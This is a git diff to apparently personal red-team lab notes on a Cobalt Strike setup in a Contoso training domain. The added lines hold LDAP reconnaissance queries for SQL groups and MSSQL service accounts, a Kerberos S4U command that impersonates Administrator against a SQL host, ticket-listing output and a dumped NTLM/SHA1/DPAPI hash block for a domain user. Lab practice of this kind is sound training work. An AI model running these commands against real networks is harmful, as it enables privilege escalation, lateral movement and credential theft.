@@ -28,8 +28,12 @@ To modify your C2 profile:
 4. Run sudo /usr/bin/docker restart cobalt to restart the Docker container.
 5. If the container fails to start, run sudo /usr/bin/docker logs cobalt to see the errors.
 
+---
 
-
+## Set the beacon size
+```
+set tasks_max_size "2097152";
+```
 # note
 is admin:
 ```
@@ -37,6 +41,42 @@ is admin:
 ```
 id dub domain
 
+BRO I GUESS I SHOULD HAVE IMPERSONATE THIS USER, NOT THE ADMIN?!
+i should have run this:
+```
+ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
+```
+
+Finding db instance:
+```
+ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
+```
+
+LINK THE DB VIA A LOW LEVEL USER!
+
+SQL from dub-web-1
+```
+krb_s4u /ticket:doIF4jNPTQ== /service:MSSQLSvc/dub-sql-1.dublin.contoso.com /altservice:cifs /impersonateuser:Administrator
+```
+
+uff:
+```
+
+Action: List Kerberos Tickets (All Users)
 
 
-ali
+--------------------------------------------------------------------------------------------------------------------------
+| LUID        | Client                                   | Service                                  |            End Time |
+--------------------------------------------------------------------------------------------------------------------------
+| 0:0x6162a6  | Administrator @ DUBLIN.CONTOSO.COM       | cifs/dub-sql-1.dublin.contoso.com 
+```
+
+tdobson hash:
+```
+ [00000003] Primary
+	 * Username : tdobson
+	 * Domain   : DUBLIN
+	 * NTLM     : 4a0f9bc164edc4aab545196cce6d7c9d
+	 * SHA1     : 27e227423cad68e99a36abecabf1a7acebd7fa91
+	 * DPAPI    : 5680fc1051d04d4055279e2b729e9be9
+```
